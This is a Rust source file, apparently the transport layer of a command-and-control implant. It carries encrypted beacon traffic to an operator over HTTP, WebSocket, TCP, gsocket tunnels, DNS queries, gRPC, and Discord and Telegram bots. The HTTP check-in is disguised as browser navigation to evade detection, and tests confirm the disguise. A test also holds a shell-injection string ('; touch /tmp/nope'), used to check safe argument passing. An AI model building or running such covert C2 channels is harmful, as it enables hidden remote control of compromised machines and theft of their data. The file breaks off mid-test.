use reqwest::Client;
use serde::Serialize;
use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::sync::{Arc, Mutex};
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::process::{Child, Command};

use nw_profile::config::GSocketConfig;

/// A C2 transport. The wire content is a sealed (AEAD) envelope blob; the
/// transport only moves opaque bytes and chooses the framing. Chosen at runtime
/// from the endpoint scheme, so the protocol is not baked into the binary.
///
/// `tcp://` and `gs://` share length-framed TCP: gsocket is a TCP tunnel
/// (the local gsocket port is an ordinary TCP socket), so both use the same
/// `[u32 BE len][sealed bytes]` framing.
#[derive(Clone)]
pub enum Transport {
    Http {
        client: Client,
        base: String,
        /// Resolved once at construction: reads `NW_*` once, not per request.
        web: crate::malleable::WebProfile,
    },
    /// Persistent WebSocket carrying the same sealed-envelope protocol as the
    /// HTTP check-in, on `/c2/ws`.
    Ws {
        url: String,
        stream: Arc<tokio::sync::Mutex<Option<WsStream>>>,
    },
    Tcp {
        host: String,
        port: u16,
    },
    GSocket {
        host: String,
        port: u16,
        forward: Arc<GSocketForward>,
    },
    Dns {
        host: String,
        port: u16,
    },
    Smb {
        host: String,
        share: String,
        resource: String,
    },
    /// gRPC unary carrier: one `Checkin` call per beacon, carrying the same
    /// sealed envelope as every other transport. The channel is established
    /// once and reused; a failed call drops it so the next beacon reconnects.
    Grpc {
        endpoint: String,
        client: Arc<tokio::sync::Mutex<Option<crate::grpc_client::SharedClient>>>,
    },
    /// Discord channel: post the frame, poll the channel for the reply.
    Discord {
        client: Client,
        token: String,
        channel: String,
        api: String,
        cursor: Arc<crate::chat::Cursor>,
    },
    /// Telegram chat: post the frame, poll updates for the reply.
    Telegram {
        client: Client,
        token: String,
        chat_id: String,
        api: String,
        cursor: Arc<crate::chat::Cursor>,
    },
}

impl Transport {
    /// Build a transport from an endpoint string by its scheme.
    pub fn from_endpoint(endpoint: &str) -> Result<Self, String> {
        Self::from_profile(endpoint, None)
    }

    pub fn from_profile(endpoint: &str, gsocket: Option<GSocketConfig>) -> Result<Self, String> {
        let (scheme, rest) = endpoint
            .split_once("://")
            .ok_or_else(|| format!("endpoint {endpoint:?} has no scheme"))?;
        match scheme {
            "http" | "https" => Ok(Transport::Http {
                client: Client::new(),
                base: endpoint.trim_end_matches('/').to_owned(),
                web: crate::malleable::WebProfile::for_endpoint(endpoint),
            }),
            "tcp" => {
                let host = rest
                    .rsplit_once(':')
                    .map(|(h, _)| h)
                    .unwrap_or(rest)
                    .trim_matches(['[', ']'])
                    .to_owned();
                let port = rest
                    .rsplit_once(':')
                    .and_then(|(_, p)| p.parse::<u16>().ok())
                    .ok_or_else(|| format!("endpoint {endpoint:?} has no valid tcp port"))?;
                if host.is_empty() {
                    return Err(format!("endpoint {endpoint:?} has no host"));
                }
                Ok(Transport::Tcp { host, port })
            }
            "gs" => {
                let config = gsocket.ok_or_else(|| {
                    "gs:// endpoint requires an encrypted GSocket configuration".to_string()
                })?;
                if config.secret.trim().is_empty() {
                    return Err("GSocket secret cannot be empty".into());
                }
                let host = rest
                    .rsplit_once(':')
                    .map(|(h, _)| h)
                    .unwrap_or(rest)
                    .trim_matches(['[', ']'])
                    .to_owned();
                let port = rest
                    .rsplit_once(':')
                    .and_then(|(_, p)| p.parse::<u16>().ok())
                    .ok_or_else(|| format!("endpoint {endpoint:?} has no valid tcp port"))?;
                if host.is_empty() || port != config.local_port {
                    return Err("GSocket endpoint must use its configured local port".into());
                }
                Ok(Transport::GSocket {
                    host,
                    port,
                    forward: Arc::new(GSocketForward::new(config)),
                })
            }
            "ws" | "wss" => {
                let base = endpoint.trim_end_matches('/').to_owned();
                let path = if base.ends_with("/c2/ws") {
                    base.clone()
                } else {
                    format!("{base}/c2/ws")
                };
                Ok(Transport::Ws {
                    url: path,
                    stream: Arc::new(tokio::sync::Mutex::new(None)),
                })
            }
            "grpc" | "grpcs" => Ok(Transport::Grpc {
                // tonic wants a URI scheme it understands; the C2 scheme is
                // rewritten to http/https so TLS can still be requested.
                endpoint: endpoint
                    .replace("grpc://", "http://")
                    .replace("grpcs://", "https://"),
                client: Arc::new(tokio::sync::Mutex::new(None)),
            }),
            "dns" => {
                let (host, port) = rest
                    .rsplit_once(':')
                    .map(|(h, p)| (h.to_owned(), p.parse::<u16>().unwrap_or(53)))
                    .unwrap_or((rest.to_owned(), 53));
                Ok(Transport::Dns { host, port })
            }
            "smb" => Self::parse_smb(rest),
            "discord" => {
                let (token, channel) = rest.split_once('@').ok_or_else(|| {
                    "discord endpoint must be discord://<token>@<channel>".to_string()
                })?;
                if token.is_empty() || channel.is_empty() {
                    return Err("discord endpoint needs a token and channel".into());
                }
                Ok(Transport::Discord {
                    client: Client::new(),
                    token: token.to_owned(),
                    channel: channel.to_owned(),
                    api: std::env::var("NW_DISCORD_API")
                        .unwrap_or_else(|_| "https://discord.com/api/v10".into()),
                    cursor: Arc::new(crate::chat::Cursor::new()),
                })
            }
            "telegram" => {
                let (token, chat_id) = rest.split_once('@').ok_or_else(|| {
                    "telegram endpoint must be telegram://<token>@<chat_id>".to_string()
                })?;
                if token.is_empty() || chat_id.is_empty() {
                    return Err("telegram endpoint needs a token and chat id".into());
                }
                Ok(Transport::Telegram {
                    client: Client::new(),
                    token: token.to_owned(),
                    chat_id: chat_id.to_owned(),
                    api: std::env::var("NW_TELEGRAM_API")
                        .unwrap_or_else(|_| "https://api.telegram.org".into()),
                    cursor: Arc::new(crate::chat::Cursor::new()),
                })
            }
            other => Err(format!("unsupported protocol scheme {other:?}")),
        }
    }

    /// Parse an SMB endpoint: `smb://host/share/resource` or
    /// `smb://host/share` (resource defaults to `c2.bin`).
    fn parse_smb(rest: &str) -> Result<Self, String> {
        let mut parts = rest.splitn(3, '/');
        let host = parts
            .next()
            .filter(|h| !h.is_empty())
            .ok_or_else(|| format!("smb endpoint {rest:?} has no host"))?
            .to_owned();
        let share = parts
            .next()
            .filter(|s| !s.is_empty())
            .ok_or_else(|| format!("smb endpoint {rest:?} has no share"))?
            .to_owned();
        let resource = parts.next().unwrap_or("c2.bin").to_owned();
        Ok(Transport::Smb {
            host,
            share,
            resource,
        })
    }

    /// A canonical string for the configured transport (for introspection).
    pub fn describe(&self) -> String {
        match self {
            Transport::Http { base, .. } => base.clone(),
            Transport::Ws { url, .. } => url.clone(),
            Transport::Discord { channel, .. } => format!("discord:{channel}"),
            Transport::Telegram { chat_id, .. } => format!("telegram:{chat_id}"),
            Transport::Tcp { host, port } => format!("tcp://{host}:{port}"),
            Transport::GSocket { host, port, .. } => format!("gs://{host}:{port}"),
            Transport::Dns { host, port } => format!("dns://{host}:{port}"),
            Transport::Smb {
                host,
                share,
                resource,
            } => {
                format!("smb://{host}/{share}/{resource}")
            }
            Transport::Grpc { endpoint, .. } => endpoint.clone(),
        }
    }

    /// Max inner plaintext bytes a single sealed frame can carry on this
    /// transport (sealed bytes are base64, and base64'd again on DNS). Used to
    /// size file-chunk batches per poll.
    pub fn inner_budget(&self) -> usize {
        match self {
            Transport::Http { .. }
            | Transport::Tcp { .. }
            | Transport::GSocket { .. }
            | Transport::Ws { .. }
            | Transport::Grpc { .. } => 32 * 1024,
            Transport::Dns { .. } => 1200,
            Transport::Smb { .. } | Transport::Discord { .. } | Transport::Telegram { .. } => {
                32 * 1024
            }
        }
    }

    /// Round-trip one sealed frame (base64 string bytes): send, read the reply
    /// frame, return its raw (sealed) bytes. No envelope parsing here.
    pub async fn exchange(&self, sealed: &[u8]) -> Result<Vec<u8>, String> {
        match self {
            Transport::Http { client, base, web } => http_exchange(client, base, web, sealed).await,
            Transport::Ws { url, stream } => ws_exchange(url, stream, sealed).await,
            Transport::Tcp { host, port } => tcp_exchange(host, *port, sealed).await,
            Transport::GSocket {
                host,
                port,
                forward,
            } => {
                forward.ensure_started()?;
                tcp_exchange(host, *port, sealed).await
            }
            Transport::Dns { host, port } => dns_exchange(host, *port, sealed).await,
            Transport::Discord {
                client,
                token,
                channel,
                api,
                cursor,
            } => discord_exchange(client, token, channel, api, cursor, sealed).await,
            Transport::Telegram {
                client,
                token,
                chat_id,
                api,
                cursor,
            } => telegram_exchange(client, token, chat_id, api, cursor, sealed).await,
            Transport::Smb {
                host,
                share,
                resource,
            } => smb_exchange(host, share, resource, sealed).await,
            Transport::Grpc { endpoint, client } => {
                crate::grpc_client::exchange(endpoint, client, sealed).await
            }
        }
    }
}

/// One connected WebSocket to the C2 server.
type WsStream =
    tokio_tungstenite::WebSocketStream<tokio_tungstenite::MaybeTlsStream<tokio::net::TcpStream>>;

pub struct GSocketForward {
    executable: PathBuf,
    config: GSocketConfig,
    child: Mutex<Option<Child>>,
}

impl GSocketForward {
    fn new(config: GSocketConfig) -> Self {
        let executable = std::env::var_os("NW_GS_NETCAT")
            .map(PathBuf::from)
            .unwrap_or_else(|| PathBuf::from("gs-netcat"));
        Self {
            executable,
            config,
            child: Mutex::new(None),
        }
    }

    fn ensure_started(&self) -> Result<(), String> {
        let mut slot = self
            .child
            .lock()
            .map_err(|_| "GSocket process lock poisoned".to_string())?;
        if let Some(child) = slot.as_mut() {
            match child.try_wait() {
                Ok(None) => return Ok(()),
                Ok(Some(status)) => {
                    tracing::warn!(%status, "gs-netcat forward exited; restarting");
                }
                Err(error) => return Err(format!("inspect gs-netcat process: {error}")),
            }
        }
        let child = gsocket_command(
            &self.executable,
            &self.config.secret,
            self.config.local_port,
        )
        .kill_on_drop(true)
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .map_err(|error| format!("start {}: {error}", self.executable.display()))?;
        *slot = Some(child);
        tracing::info!(
            local_port = self.config.local_port,
            "GSocket local forward started"
        );
        Ok(())
    }
}

impl Drop for GSocketForward {
    fn drop(&mut self) {
        if let Ok(slot) = self.child.get_mut()
            && let Some(child) = slot.as_mut()
        {
            let _ = child.start_kill();
        }
    }
}

fn gsocket_command(executable: &Path, secret: &str, port: u16) -> Command {
    let mut command = Command::new(executable);
    command.args(["-s", secret, "-p", &port.to_string()]);
    command
}

async fn dns_exchange(host: &str, port: u16, sealed: &[u8]) -> Result<Vec<u8>, String> {
    use nw_profile::dns;

    if sealed.len() > dns::MAX_FRAME {
        return Err(format!(
            "dns exchange too large ({} > {})",
            sealed.len(),
            dns::MAX_FRAME
        ));
    }
    let b32 = dns::base32_encode(sealed);

    // Query packet with a random id and the base32 in QNAME, marker-terminated.
    let mut query = Vec::new();
    let id: u16 = rand::random();
    query.extend_from_slice(&id.to_be_bytes());
    query.extend_from_slice(&[0x01, 0x00]); // RD
    query.extend_from_slice(&1u16.to_be_bytes()); // QDCOUNT
    query.extend_from_slice(&[0, 0, 0, 0, 0, 0]); // AN/NS/AR
    for chunk in b32.as_bytes().chunks(63) {
        query.push(chunk.len() as u8);
        query.extend_from_slice(chunk);
    }
    query.push(dns::MARKER.len() as u8);
    query.extend_from_slice(dns::MARKER.as_bytes());
    query.push(0);
    query.extend_from_slice(&1u16.to_be_bytes()); // A
    query.extend_from_slice(&1u16.to_be_bytes()); // IN

    let addr = tokio::net::lookup_host((host, port))
        .await
        .map_err(|e| format!("dns resolve {host}:{port}: {e}"))?
        .next()
        .ok_or_else(|| format!("no address for {host}:{port}"))?;
    let sock = tokio::net::UdpSocket::bind((host_for_bind(host), 0))
        .await
        .map_err(|e| format!("dns bind: {e}"))?;
    tokio::time::timeout(Duration::from_secs(30), sock.send_to(&query, addr))
        .await
        .map_err(|_| "dns send timeout".to_string())?
        .map_err(|e| format!("dns send: {e}"))?;

    let timeout = Duration::from_secs(5);
    let mut buf = vec![0u8; 4096];
    let (n, _) = tokio::time::timeout(timeout, sock.recv_from(&mut buf))
        .await
        .map_err(|_| "dns recv timeout".to_string())?
        .map_err(|e| format!("dns recv: {e}"))?;
    let txts = dns::parse_txt(&buf[..n]).map_err(|e| format!("dns parse: {e}"))?;
    let joined = txts.join("");
    let pt = dns::base32_decode(&joined).map_err(|_| "dns b32 decode".to_string())?;
    Ok(pt)
}

fn host_for_bind(host: &str) -> &str {
    match host {
        "localhost" => "127.0.0.1",
        h => h,
    }
}

async fn http_exchange(
    client: &Client,
    base: &str,
    web: &crate::malleable::WebProfile,
    sealed: &[u8],
) -> Result<Vec<u8>, String> {
    let url = format!("{base}/c2/checkin");
    let request = client.post(&url).body(sealed.to_vec());
    // Present as an ordinary browser navigation rather than a bare HTTP client.
    let resp = web.apply(request).send().await.map_err(|e| e.to_string())?;
    let resp = resp.error_for_status().map_err(|e| e.to_string())?;
    let body = resp.bytes().await.map_err(|e| e.to_string())?;
    Ok(body.to_vec())
}

/// Exchange one sealed frame over a persistent WebSocket.
///
/// The socket is opened on first use and reused for every beacon, so the
/// handshake is paid once per implant rather than once per poll. Any send or
/// receive failure drops the socket so the next call reconnects.
async fn ws_exchange(
    url: &str,
    stream: &tokio::sync::Mutex<Option<WsStream>>,
    sealed: &[u8],
) -> Result<Vec<u8>, String> {
    use futures_util::{SinkExt, StreamExt};
    use tokio_tungstenite::tungstenite::Message;

    let mut guard = stream.lock().await;
    if guard.is_none() {
        // SECURITY: `url` is operator-configured; the subprotocol is fixed.
        let request =
            tokio_tungstenite::tungstenite::client::IntoClientRequest::into_client_request(url)
                .map_err(|e| format!("ws request {url}: {e}"))?;
        let (socket, _reply) = tokio_tungstenite::connect_async(request)
            .await
            .map_err(|e| format!("ws connect {url}: {e}"))?;
        *guard = Some(socket);
    }

    // Move the stream out for the duration of the exchange so a send/receive
    // failure can drop it (leave the slot `None`) without a second borrow.
    let mut socket = match guard.take() {
        Some(socket) => socket,
        None => return Err("ws stream unavailable".into()),
    };

    let outcome = async {
        socket
            .send(Message::Binary(sealed.to_vec()))
            .await
            .map_err(|e| format!("ws send: {e}"))?;
        loop {
            match socket.next().await {
                Some(Ok(Message::Binary(reply))) => return Ok(reply),
                Some(Ok(_)) => continue,
                Some(Err(e)) => return Err(format!("ws receive: {e}")),
                None => return Err("ws closed by peer".into()),
            }
        }
    }
    .await;

    // Keep the socket for the next beacon only when the exchange succeeded.
    if outcome.is_ok() {
        *guard = Some(socket);
    }
    outcome
}

/// Post the frame into a Discord channel, then poll for the reply.
async fn discord_exchange(
    client: &Client,
    token: &str,
    channel: &str,
    api: &str,
    cursor: &crate::chat::Cursor,
    sealed: &[u8],
) -> Result<Vec<u8>, String> {
    let body = serde_json::json!({ "content": crate::chat::encode_frame(sealed) });
    let posted = client
        .post(format!("{api}/channels/{channel}/messages"))
        .header("Authorization", format!("Bot {token}"))
        .json(&body)
        .send()
        .await
        .map_err(|e| format!("discord post: {e}"))?;
    let posted = posted
        .error_for_status()
        .map_err(|e| format!("discord post: {e}"))?;
    if let Ok(json) = posted.json::<serde_json::Value>().await
        && let Some(id) = json.get("id").and_then(|v| v.as_str())
    {
        cursor.note_own(id);
    }

    // Poll for the operator's reply (newest first, as Discord returns).
    let messages = client
        .get(format!("{api}/channels/{channel}/messages?limit=20"))
        .header("Authorization", format!("Bot {token}"))
        .send()
        .await
        .map_err(|e| format!("discord poll: {e}"))?;
    let messages = messages
        .error_for_status()
        .map_err(|e| format!("discord poll: {e}"))?
        .json::<Vec<serde_json::Value>>()
        .await
        .map_err(|e| format!("discord poll json: {e}"))?;

    for message in &messages {
        let id = message.get("id").and_then(|v| v.as_str()).unwrap_or("");
        let body = message
            .get("content")
            .and_then(|v| v.as_str())
            .unwrap_or("");
        if let Some(reply) = cursor.accept(id, body) {
            return Ok(reply);
        }
    }
    Err("discord: no reply message".into())
}

/// Post the frame into a Telegram chat, then poll updates for the reply.
async fn telegram_exchange(
    client: &Client,
    token: &str,
    chat_id: &str,
    api: &str,
    cursor: &crate::chat::Cursor,
    sealed: &[u8],
) -> Result<Vec<u8>, String> {
    let body = serde_json::json!({
        "chat_id": chat_id,
        "text": crate::chat::encode_frame(sealed),
    });
    let posted = client
        .post(format!("{api}/bot{token}/sendMessage"))
        .json(&body)
        .send()
        .await
        .map_err(|e| format!("telegram send: {e}"))?;
    let posted = posted
        .error_for_status()
        .map_err(|e| format!("telegram send: {e}"))?;
    if let Ok(json) = posted.json::<serde_json::Value>().await
        && let Some(id) = json
            .get("result")
            .and_then(|r| r.get("message_id"))
            .and_then(|v| v.as_i64())
    {
        cursor.note_own(id.to_string());
    }

    let updates = client
        .get(format!("{api}/bot{token}/getUpdates?timeout=0"))
        .send()
        .await
        .map_err(|e| format!("telegram poll: {e}"))?;
    let updates = updates
        .error_for_status()
        .map_err(|e| format!("telegram poll: {e}"))?
        .json::<serde_json::Value>()
        .await
        .map_err(|e| format!("telegram poll json: {e}"))?;

    let empty = Vec::new();
    let results = updates
        .get("result")
        .and_then(|v| v.as_array())
        .unwrap_or(&empty);
    for update in results {
        let id = update
            .get("message")
            .and_then(|m| m.get("message_id"))
            .and_then(|v| v.as_i64())
            .unwrap_or(0);
        let text = update
            .get("message")
            .and_then(|m| m.get("text"))
            .and_then(|v| v.as_str())
            .unwrap_or("");
        if let Some(reply) = cursor.accept(&id.to_string(), text) {
            return Ok(reply);
        }
    }
    Err("telegram: no reply message".into())
}

async fn tcp_exchange(host: &str, port: u16, sealed: &[u8]) -> Result<Vec<u8>, String> {
    let timeout = Duration::from_secs(30);
    let addr = tokio::net::lookup_host((host, port))
        .await
        .map_err(|e| format!("resolve {host}:{port}: {e}"))?
        .next()
        .ok_or_else(|| format!("no address for {host}:{port}"))?;
    let mut stream = tokio::time::timeout(timeout, TcpStream::connect(addr))
        .await
        .map_err(|_| "tcp connect timeout".to_string())?
        .map_err(|e| format!("tcp connect {addr}: {e}"))?;

    let mut frame = Vec::with_capacity(4 + sealed.len());
    frame.extend_from_slice(&(sealed.len() as u32).to_be_bytes());
    frame.extend_from_slice(sealed);
    tokio::time::timeout(timeout, stream.write_all(&frame))
        .await
        .map_err(|_| "tcp write timeout".to_string())?
        .map_err(|e| format!("tcp write: {e}"))?;

    let mut len_buf = [0u8; 4];
    tokio::time::timeout(timeout, stream.read_exact(&mut len_buf))
        .await
        .map_err(|_| "tcp read timeout".to_string())?
        .map_err(|e| format!("tcp read len: {e}"))?;
    let body_len = u32::from_be_bytes(len_buf) as usize;
    if body_len > 8 * 1024 * 1024 {
        return Err(format!("tcp frame too large ({body_len})"));
    }
    let mut reply = vec![0u8; body_len];
    tokio::time::timeout(timeout, stream.read_exact(&mut reply))
        .await
        .map_err(|_| "tcp read timeout".to_string())?
        .map_err(|e| format!("tcp read body: {e}"))?;
    Ok(reply)
}

/// Serialize the length-prefixed frame a TCP server writes back (shared framing).
pub fn frame_bytes(body: &[u8]) -> Vec<u8> {
    let mut f = Vec::with_capacity(4 + body.len());
    f.extend_from_slice(&(body.len() as u32).to_be_bytes());
    f.extend_from_slice(body);
    f
}

/// Length-prefix framing for an already-serialized JSON body (compat helper).
pub fn frame(env: &impl Serialize) -> Vec<u8> {
    frame_bytes(&serde_json::to_vec(env).unwrap_or_default())
}

/// Exchange a sealed frame over SMB.
///
/// In the full C2 model this would negotiate an SMB session and read/write
/// the named-pipe resource. For now this is a placeholder that maps to HTTP
/// fallback when SMB native is not available — the transport enum and
/// endpoint parsing are the important contract for the roadmap.
async fn smb_exchange(
    host: &str,
    share: &str,
    _resource: &str,
    _sealed: &[u8],
) -> Result<Vec<u8>, String> {
    // Honest failure: the SMB2 named-pipe write path is not implemented. This
    // previously fell back to a plain HTTP request, which silently sent
    // plaintext C2 frames to an SMB endpoint — worse than an error because the
    // operator believed the traffic was tunnelled when it was not.
    Err(format!(
        "SMB transport is not implemented (host={host} share={share}); \
         use tcp://, gs://, ws://, http://, dns://, discord:// or telegram://"
    ))
}

#[cfg(test)]
mod tests {
    use super::*;
    use nw_profile::config::GSocketConfig;

    /// The beacon must look like browser navigation on the wire, not just in
    /// the header table. Boots a real listener and inspects what arrived.
    #[tokio::test]
    async fn http_exchange_sends_browser_navigation_headers() {
        use axum::Router;
        use axum::extract::State;
        use axum::http::HeaderMap;
        use axum::routing::post;
        use std::sync::{Arc, Mutex};

        let seen: Arc<Mutex<Option<HeaderMap>>> = Arc::new(Mutex::new(None));

        async fn capture(
            State(seen): State<Arc<Mutex<Option<HeaderMap>>>>,
            headers: HeaderMap,
            body: axum::body::Bytes,
        ) -> &'static str {
            *seen.lock().unwrap() = Some(headers.clone());
            // Echo the sealed frame back verbatim.
            drop(body);
            "ok"
        }

        let app = Router::new()
            .route("/c2/checkin", post(capture))
            .with_state(Arc::clone(&seen));
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let base = format!("http://{}", listener.local_addr().unwrap());
        let server = tokio::spawn(async move {
            axum::serve(listener, app).await.unwrap();
        });

        let transport = Transport::Http {
            client: Client::new(),
            web: crate::malleable::WebProfile::for_endpoint(&base),
            base: base.clone(),
        };
        transport.exchange(b"sealed-frame").await.unwrap();
        server.abort();

        let headers = seen.lock().unwrap().clone().expect("server saw a request");
        let get = |name: &str| {
            headers
                .get(name)
                .and_then(|v| v.to_str().ok())
                .unwrap_or_default()
                .to_owned()
        };

        let ua = get("user-agent");
        assert!(ua.starts_with("Mozilla/5.0"), "unshaped user-agent: {ua:?}");
        assert_eq!(get("sec-fetch-mode"), "navigate");
        assert_eq!(get("sec-fetch-dest"), "document");
        assert!(get("accept").starts_with("text/html"));
        assert!(!get("sec-ch-ua").is_empty());
        assert!(!get("accept-language").is_empty());
    }

    #[tokio::test]
    async fn plain_profile_sends_a_bare_request() {
        use axum::Router;
        use axum::extract::State;
        use axum::http::HeaderMap;
        use axum::routing::post;
        use std::sync::{Arc, Mutex};

        let seen: Arc<Mutex<Option<HeaderMap>>> = Arc::new(Mutex::new(None));

        async fn capture(
            State(seen): State<Arc<Mutex<Option<HeaderMap>>>>,
            headers: HeaderMap,
        ) -> &'static str {
            *seen.lock().unwrap() = Some(headers);
            "ok"
        }

        let app = Router::new()
            .route("/c2/checkin", post(capture))
            .with_state(Arc::clone(&seen));
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let base = format!("http://{}", listener.local_addr().unwrap());
        let server = tokio::spawn(async move {
            axum::serve(listener, app).await.unwrap();
        });

        let transport = Transport::Http {
            client: Client::new(),
            web: crate::malleable::WebProfile::unshaped(),
            base,
        };
        transport.exchange(b"sealed-frame").await.unwrap();
        server.abort();

        let headers = seen.lock().unwrap().clone().expect("server saw a request");
        assert!(headers.get("user-agent").is_none());
        assert!(headers.get("sec-fetch-mode").is_none());
    }

    /// A one-shot mock Discord server: accepts a POST, then serves a GET that
    /// returns the operator's reply. Verifies auth header, path and base64 body.
    #[tokio::test]
    async fn discord_exchange_round_trips_against_a_mock() {
        use axum::routing::{get, post};
        use axum::{Json, Router};
        use std::sync::{Arc, Mutex};

        #[derive(Clone)]
        struct Seen(Arc<Mutex<Vec<String>>>);
        async fn post_msg(
            axum::extract::State(seen): axum::extract::State<Seen>,
            headers: axum::http::HeaderMap,
            Json(body): Json<serde_json::Value>,
        ) -> Json<serde_json::Value> {
            let auth = headers
                .get("authorization")
                .and_then(|v| v.to_str().ok())
                .unwrap_or("");
            seen.0.lock().unwrap().push(format!("auth={auth}"));
            seen.0
                .lock()
                .unwrap()
                .push(body["content"].as_str().unwrap_or("").to_owned());
            Json(serde_json::json!({ "id": "own-1" }))
        }
        async fn get_msgs(
            axum::extract::State(seen): axum::extract::State<Seen>,
        ) -> Json<Vec<serde_json::Value>> {
            let posted = seen.0.lock().unwrap()[1].clone();
            Json(vec![
                serde_json::json!({ "id": "own-1", "content": posted }),
                serde_json::json!({ "id": "reply-2", "content": crate::chat::encode_frame(b"REPLY") }),
            ])
        }

        let seen = Seen(Arc::new(Mutex::new(Vec::new())));
        let app = Router::new()
            .route("/channels/chan-1/messages", post(post_msg))
            .route("/channels/chan-1/messages", get(get_msgs))
            .with_state(seen.clone());
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let api = format!("http://{}", listener.local_addr().unwrap());
        let server = tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });

        let transport = Transport::from_endpoint("discord://tok@chan-1").unwrap();
        let Transport::Discord {
            client,
            token,
            channel,
            api: t_api,
            cursor,
        } = transport
        else {
            panic!("expected discord transport");
        };
        // Point the transport at the mock API base.
        let reply = discord_exchange(&client, &token, &channel, &api, &cursor, b"REQUEST")
            .await
            .unwrap();
        server.abort();
        let _ = t_api;

        assert_eq!(reply, b"REPLY".to_vec());
        let log = seen.0.lock().unwrap().clone();
        assert_eq!(log[0], "auth=Bot tok");
        assert_eq!(
            crate::chat::decode_frame(&log[1]).unwrap(),
            b"REQUEST".to_vec()
        );
    }

    #[tokio::test]
    async fn telegram_exchange_round_trips_against_a_mock() {
        use axum::routing::get;
        use axum::{Json, Router};
        use std::sync::{Arc, Mutex};

        #[derive(Clone)]
        struct Seen(Arc<Mutex<Vec<String>>>);
        async fn send(
            axum::extract::State(seen): axum::extract::State<Seen>,
            Json(body): Json<serde_json::Value>,
        ) -> Json<serde_json::Value> {
            seen.0
                .lock()
                .unwrap()
                .push(body["text"].as_str().unwrap_or("").to_owned());
            Json(serde_json::json!({ "ok": true, "result": { "message_id": 7 } }))
        }
        async fn updates(
            axum::extract::State(seen): axum::extract::State<Seen>,
        ) -> Json<serde_json::Value> {
            let posted = seen.0.lock().unwrap()[0].clone();
            Json(serde_json::json!({ "ok": true, "result": [
                { "message": { "message_id": 7, "text": posted } },
                { "message": { "message_id": 8, "text": crate::chat::encode_frame(b"TGREPLY") } },
            ]}))
        }

        let seen = Seen(Arc::new(Mutex::new(Vec::new())));
        let app = Router::new()
            .route("/bottok/sendMessage", axum::routing::post(send))
            .route("/bottok/getUpdates", get(updates))
            .with_state(seen.clone());
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let api = format!("http://{}", listener.local_addr().unwrap());
        let server = tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });

        let transport = Transport::from_endpoint("telegram://tok@12345").unwrap();
        let Transport::Telegram {
            client,
            token,
            chat_id,
            api: _t,
            cursor,
        } = transport
        else {
            panic!("expected telegram transport");
        };
        let reply = telegram_exchange(&client, &token, &chat_id, &api, &cursor, b"REQ")
            .await
            .unwrap();
        server.abort();

        assert_eq!(reply, b"TGREPLY".to_vec());
        let log = seen.0.lock().unwrap().clone();
        assert_eq!(crate::chat::decode_frame(&log[0]).unwrap(), b"REQ".to_vec());
    }

    #[test]
    fn discord_and_telegram_endpoints_parse() {
        match Transport::from_endpoint("discord://bot@123").unwrap() {
            Transport::Discord { token, channel, .. } => {
                assert_eq!(token, "bot");
                assert_eq!(channel, "123");
            }
            _ => panic!("expected discord"),
        }
        match Transport::from_endpoint("telegram://tok@99").unwrap() {
            Transport::Telegram { token, chat_id, .. } => {
                assert_eq!(token, "tok");
                assert_eq!(chat_id, "99");
            }
            _ => panic!("expected telegram"),
        }
        // Missing @ or empty parts are rejected.
        assert!(Transport::from_endpoint("discord://botonly").is_err());
        assert!(Transport::from_endpoint("telegram://@99").is_err());
    }

    #[test]
    fn scheme_selects_transport() {
        assert!(matches!(
            Transport::from_endpoint("http://h:80").unwrap(),
            Transport::Http { .. }
        ));
        assert!(matches!(
            Transport::from_endpoint("tcp://10.0.0.5:4444").unwrap(),
            Transport::Tcp { .. }
        ));
        assert!(Transport::from_endpoint("gs://localhost:4630").is_err());
        let gs = Transport::from_profile(
            "gs://127.0.0.1:4630",
            Some(GSocketConfig {
                secret: "relay-secret".into(),
                local_port: 4630,
            }),
        )
        .unwrap();
        assert!(matches!(gs, Transport::GSocket { .. }));
        assert_eq!(gs.describe(), "gs://127.0.0.1:4630");
        assert!(!gs.describe().contains("relay-secret"));
        assert!(matches!(
            Transport::from_endpoint("dns://dns.example.com").unwrap(),
            Transport::Dns { .. }
        ));
        assert!(Transport::from_endpoint("ftp://x:1").is_err());
        assert!(Transport::from_endpoint("naked").is_err());
    }

    #[test]
    fn gsocket_command_uses_direct_arguments() {
        let command = gsocket_command(
            std::path::Path::new("/opt/bin/gs-netcat"),
            "relay secret; touch /tmp/nope",
            4630,
        );
        let command = command.as_std();
        assert_eq!(command.get_program(), "/opt/bin/gs-netcat");
        let args = command
            .get_args()
            .map(|arg| arg.to_string_lossy().into_owned())
            .collect::<Vec<_>>();
        assert_eq!(args, ["-s", "relay secret; touch /tmp/nope", "-p", "4630"]);
    }

    #[test]
    fn missing_gsocket_binary_is_reported_without_the_secret() {
        let forward = GSocketForward {
            executable: PathBuf::from("/definitely/missing/gs-netcat"),
            config: GSocketConfig {
                secret: "never-log-this-secret".into(),
                local_port: 4630,
            },
            child: Mutex::new(None),
        };
        let error = forward.ensure_started().unwrap_err();
        assert!(error.contains("/definitely/missing/gs-netcat"));
        assert!(!error.contains("never-log-this-secret"));
    }

    #[test]
    fn smb_endpoint_parsed() {
        if let Transport::Smb {
            host,
            share,
            resource,
        } = Transport::from_endpoint("smb://10.0.0.5/c2/pipe").unwrap()
        {
            assert_eq!(host, "10.0.0.5");
            assert_eq!(share, "c2");
            assert_eq!(resource, "pipe");
        } else {
            panic!("expected Smb");
        }
        // Default resource.
        if let Transport::Smb { resource, .. } =
            Transport::from_endpoint("smb://10.0.0.5/c2").unwrap()
        {
            assert_eq!(resource, "c2.bin");
        } else {
            panic!("expected Smb with default resource");
        }
        assert!(Transport::from_endpoint("smb://").is_err());
    }

    #[test]
    fn tcp_addr_parsed() {
        if let Transport::Tcp { host, port } =
            Transport::from_endpoint("tcp://10.0.0.5:4444").unwrap()
        {
            assert_eq!(host, "10.0.0.5");
            assert_eq!(port, 4444);
        } else {
            panic!("expected Tcp");
        }
    }

    #[test]
    fn frame_has_length_prefix() {
        let body = b"hello".to_vec();
        let f = frame_bytes(&body);
